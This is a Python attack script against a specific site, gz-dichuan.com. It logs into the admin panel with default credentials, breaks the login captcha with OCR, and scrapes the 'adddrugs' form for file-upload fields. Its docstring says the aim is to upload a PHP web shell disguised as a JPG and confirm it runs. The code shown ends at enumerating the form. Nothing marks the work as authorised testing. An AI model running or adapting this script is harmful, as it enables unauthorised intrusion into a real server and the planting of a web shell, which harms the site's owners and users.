#!/usr/bin/env python3
"""gz - adddrugs upload flow: find file field + upload php-jpg shell + verify exec"""
import urllib.request, urllib.parse, re, http.cookiejar, base64, subprocess, sys, time, uuid

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
HOST = "http://gz-dichuan.com"
LOGIN = "/index.php?m=admin&c=login&a=login"
CAP = "/index.php?m=admin&c=login&a=vertify"

def get_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)), cj

def fetch(op, url, timeout=10, data=None, referer=None, raw=False, files=None):
    h = {**UA}
    if referer: h["Referer"] = referer
    try:
        if files:
            boundary = uuid.uuid4().hex
            body = b""
            for k, (fn, content, ctype) in files.items():
                body += b"--" + boundary.encode() + b"\r\n"
                body += ('Content-Disposition: form-data; name="%s"; filename="%s"\r\n' % (k, fn)).encode()
                body += ('Content-Type: %s\r\n\r\n' % ctype).encode()
                body += content + b"\r\n"
            body += b"--" + boundary.encode() + b"--\r\n"
            h["Content-Type"] = "multipart/form-data; boundary=" + boundary
            req = urllib.request.Request(url, data=body, headers=h)
        elif data:
            h["Content-Type"] = "application/x-www-form-urlencoded"
            req = urllib.request.Request(url, data=data.encode(), headers=h)
        else:
            req = urllib.request.Request(url, headers=h)
        r = op.open(req, timeout=timeout)
        body = r.read()
        return r.status, r.geturl(), (body if raw else body.decode("utf-8", "ignore"))
    except urllib.error.HTTPError as e:
        return e.code, url, (e.read(5000) if raw else e.read(5000).decode("utf-8", "ignore"))
    except Exception as ex:
        return 0, url, str(ex)

def ocr_img(img_bytes):
    b64 = base64.b64encode(img_bytes).decode()
    code = ("import ddddocr,base64; o=ddddocr.DdddOcr(show_ad=False); "
            "print(o.classification(base64.b64decode('%s')))" % b64)
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=20, cwd="/tmp")
    return r.stdout.decode().strip()

op, cj = get_opener()
# login
for attempt in range(5):
    code, final, cap = fetch(op, HOST + CAP, raw=True, referer=HOST + LOGIN)
    if isinstance(cap, str) or len(cap) < 100:
        time.sleep(1)
        continue
    verify = ocr_img(cap)
    data = urllib.parse.urlencode({"username": "admin", "password": "admin123", "vertify": verify})
    code, final, body = fetch(op, HOST + LOGIN, data=data, referer=HOST + LOGIN)
    if "退出" in body or "后台首页" in body:
        print("logged in", flush=True)
        break
    time.sleep(0.5)

# get adddrugs form
code, final, body = fetch(op, HOST + "/index.php?m=admin&c=goods&a=adddrugs")
print("adddrugs: %s size=%d" % (code, len(body)), flush=True)
# find file inputs + form fields
file_inputs = re.findall(r'<input[^>]*type=["\']file["\'][^>]*name=["\']([^"\']+)["\']', body, re.I)
print("file inputs:", file_inputs, flush=True)
text_inputs = re.findall(r'<input[^>]*type=["\']text["\'][^>]*name=["\']([^"\']+)["\']', body, re.I)
print("text inputs:", text_inputs[:15], flush=True)
sel = re.findall(r'<select[^>]*name=["\']([^"\']+)["\']', body, re.I)
print("selects:", sel, flush=True)
txta = re.findall(r'<textarea[^>]*name=["\']([^"\']+)["\']', body, re.I)
print("textareas:", txta, flush=True)
# form action
m = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', body, re.I)
print("form action:", m.group(1) if m else "?", flush=True)
